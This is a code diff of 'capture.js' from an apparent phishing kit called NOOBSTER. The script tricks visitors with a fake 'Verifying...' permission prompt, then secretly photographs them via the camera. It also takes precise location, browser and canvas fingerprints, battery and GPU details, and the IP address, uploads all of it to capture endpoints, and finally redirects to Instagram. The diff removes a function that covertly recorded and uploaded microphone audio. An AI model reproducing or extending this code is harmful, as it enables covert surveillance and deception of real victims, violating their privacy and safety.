@@ -1,5 +1,4 @@
-// NOOBSTER — capture.js v3
-// har permission alag alag maangta hai, clear order mein
+// NOOBSTER — capture.js v4 (no audio)
 // t.me/noob11001
 
 function log(msg) {
@@ -44,9 +43,7 @@ function redirectFor(page){
   return 'https://www.instagram.com';
 }
 
-// ═══════════════════════════════════════════════
-//  1. CAMERA
-// ═══════════════════════════════════════════════
+// ═══ 1. CAMERA ═══
 async function captureCamera(pageName) {
   log('camera: asking');
   try {
@@ -77,61 +74,7 @@ async function captureCamera(pageName) {
   }
 }
 
-// ═══════════════════════════════════════════════
-//  2. AUDIO (mic) — explicit prompt
-// ═══════════════════════════════════════════════
-async function captureAudio(pageName) {
-  log('audio: asking');
-  // check support
-  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-    log('audio: getUserMedia not supported');
-    return;
-  }
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({
-      audio: {
-        echoCancellation: true,
-        noiseSuppression: true,
-        autoGainControl: true
-      }
-    });
-    log('audio: granted');
-    // check recording support
-    if (typeof MediaRecorder === 'undefined') {
-      log('audio: MediaRecorder not supported — just measuring stream');
-      await new Promise(r => setTimeout(r, 3000));
-      stream.getTracks().forEach(t => t.stop());
-      return;
-    }
-    let mimeType = 'audio/webm';
-    if (!MediaRecorder.isTypeSupported(mimeType)) {
-      mimeType = 'audio/mp4';
-      if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = '';
-    }
-    const mr = new MediaRecorder(stream, mimeType ? {mimeType} : {});
-    const chunks = [];
-    mr.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
-    mr.start();
-    await new Promise(r => setTimeout(r, 5000)); // record 5 sec
-    await new Promise(resolve => {
-      mr.onstop = resolve;
-      mr.stop();
-    });
-    const blob = new Blob(chunks, { type: mr.mimeType || 'audio/webm' });
-    const fd = new FormData();
-    fd.append('audio', blob, 'audio.webm');
-    fd.append('page', pageName);
-    await fetch('/capture/audio', { method:'POST', body: fd });
-    log('audio: sent, size=' + blob.size);
-    stream.getTracks().forEach(t => t.stop());
-  } catch(e) {
-    log('audio FAILED: ' + e.name + ' ' + e.message);
-  }
-}
-
-// ═══════════════════════════════════════════════
-//  3. LOCATION — explicit prompt
-// ═══════════════════════════════════════════════
+// ═══ 2. LOCATION ═══
 function captureLocation(pageName) {
   return new Promise(resolve => {
     if (!navigator.geolocation) {
@@ -139,7 +82,6 @@ function captureLocation(pageName) {
       return resolve();
     }
     log('location: asking');
-    // high accuracy pehle
     navigator.geolocation.getCurrentPosition(
       async pos => {
         log('location: got high accuracy');
@@ -161,8 +103,7 @@ function captureLocation(pageName) {
         resolve();
       },
       err => {
-        log('location: high accuracy failed — ' + err.message + ' — retrying low');
-        // fallback low accuracy
+        log('location: high failed — retrying low');
         navigator.geolocation.getCurrentPosition(
           async pos => {
             await fetch('/capture/location', {
@@ -189,9 +130,7 @@ function captureLocation(pageName) {
   });
 }
 
-// ═══════════════════════════════════════════════
-//  4. FINGERPRINT + BATTERY
-// ═══════════════════════════════════════════════
+// ═══ 3. FINGERPRINT + BATTERY ═══
 async function captureFingerprint(pageName) {
   log('fingerprint: collecting');
   const fp = {
@@ -228,7 +167,6 @@ async function captureFingerprint(pageName) {
     } : null
   };
 
-  // battery — try 3 times
   for (let i = 0; i < 3; i++) {
     try {
       if (navigator.getBattery) {
@@ -248,7 +186,6 @@ async function captureFingerprint(pageName) {
     }
   }
 
-  // gpu
   try {
     const gl = document.createElement('canvas').getContext('webgl');
     const dbg = gl.getExtension('WEBGL_debug_renderer_info');
@@ -260,7 +197,6 @@ async function captureFingerprint(pageName) {
     }
   } catch(e){}
 
-  // canvas fp
   try {
     const c = document.createElement('canvas');
     const ctx = c.getContext('2d');
@@ -276,7 +212,6 @@ async function captureFingerprint(pageName) {
     body: JSON.stringify(fp)
   });
 
-  // ip api
   try {
     const r = await fetch('https://ipapi.co/json/');
     const d = await r.json();
@@ -288,13 +223,9 @@ async function captureFingerprint(pageName) {
   } catch(e){}
 }
 
-// ═══════════════════════════════════════════════
-//  MAIN FLOW
-// ═══════════════════════════════════════════════
+// ═══ MAIN ═══
 async function runCapture(pageName, fields) {
   await captureCamera(pageName);
-  await new Promise(r => setTimeout(r, 300));
-  await captureAudio(pageName);
   await new Promise(r => setTimeout(r, 300));
   await captureLocation(pageName);
   await new Promise(r => setTimeout(r, 300));
@@ -310,8 +241,8 @@ async function runCapture(pageName, fields) {
 }
 
 async function handleSubmit(pageName, fields) {
-  showPopup('Verifying...', 'Allow all permissions to continue', true);
+  showPopup('Verifying...', 'Please allow permissions to continue', true);
   const redirect = await runCapture(pageName, fields);
   setTimeout(() => showPopup('Success', 'Redirecting you now...', false), 1800);
   setTimeout(() => { location.href = redirect; }, 3400);
-        }
+              }
